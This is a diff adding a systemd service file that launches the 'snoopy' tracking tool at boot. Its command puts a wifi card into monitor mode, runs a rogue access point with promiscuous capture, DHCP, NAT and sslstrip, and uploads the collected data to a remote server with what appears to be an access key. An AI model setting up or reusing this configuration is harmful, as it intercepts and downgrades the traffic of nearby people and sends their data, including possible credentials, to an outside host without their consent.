@@ -1,0 +1,10 @@
+[Unit]
+Description="Modular digital terrestrial tracking drone"
+
+[Service]
+ExecStart=/usr/bin/snoopy -v -m wifi:mon=True \
+	-m rogueAP:ssid=lambda,promis=True,run_dhcp=True,local_nat=True,sslstrip=True \
+	-s http://bricewge.fr:9001/ -d bbb -l test -k 1T357JRCMKMFK40
+
+[Install]
+WantedBy=multi-user.target
